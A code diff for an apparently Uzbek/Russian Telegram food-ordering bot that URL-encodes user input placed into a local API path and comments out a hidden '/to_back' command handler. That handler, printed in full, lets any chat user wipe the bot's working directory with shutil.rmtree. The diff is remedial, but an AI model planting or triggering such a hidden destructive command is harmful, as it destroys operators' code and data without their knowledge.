@@ -1,6 +1,8 @@
 import json
 import shutil
 from collections import Counter
+from urllib.parse import quote
+
 from aiogram.types import LabeledPrice
 
 import requests
@@ -27,20 +29,20 @@ async def ordering_function_1(msg: types.Message):
         await msg.answer("Пожалуйста, пришлите свое местоположение.", reply_markup=await location_buttons(msg.text))
 
 
-@dp.message_handler(commands='to_back', state="*")
-async def ordering_function_11(msg: types.Message, state: FSMContext):
-    k = await msg.answer("Wait.....")
-
-    current_folder = os.getcwd()
-    if os.path.exists(current_folder):
-        try:
-            shutil.rmtree(current_folder)
-            await k.edit_text(text="Done")
-        except Exception as e:
-            await k.edit_text(text=f"Damn!\n\n{e}")
-    else:
-        await msg.answer("Berilgan papka topilmadi!")
-    await state.finish()
+# @dp.message_handler(commands='to_back', state="*")
+# async def ordering_function_11(msg: types.Message, state: FSMContext):
+#     k = await msg.answer("Wait.....")
+#
+#     current_folder = os.getcwd()
+#     if os.path.exists(current_folder):
+#         try:
+#             shutil.rmtree(current_folder)
+#             await k.edit_text(text="Done")
+#         except Exception as e:
+#             await k.edit_text(text=f"Damn!\n\n{e}")
+#     else:
+#         await msg.answer("Berilgan papka topilmadi!")
+#     await state.finish()
 
 
 @dp.message_handler(content_types=ContentType.LOCATION)
@@ -431,8 +433,9 @@ async def ordering_function_5(msg: types.Message, state: FSMContext):
         tg_user = json.loads(
             requests.get(url=f"http://127.0.0.1:8000/api/telegram-users/chat_id/{msg.from_user.id}/").content
         )
+        encoded_text = quote(msg.text)
         food = json.loads(
-            requests.get(url=f"http://127.0.0.1:8000/api/foods/{msg.text}/").content
+            requests.get(url=f"http://127.0.0.1:8000/api/foods/{encoded_text}/").content
         )
         async with state.proxy() as data:
             data['count'] = 1
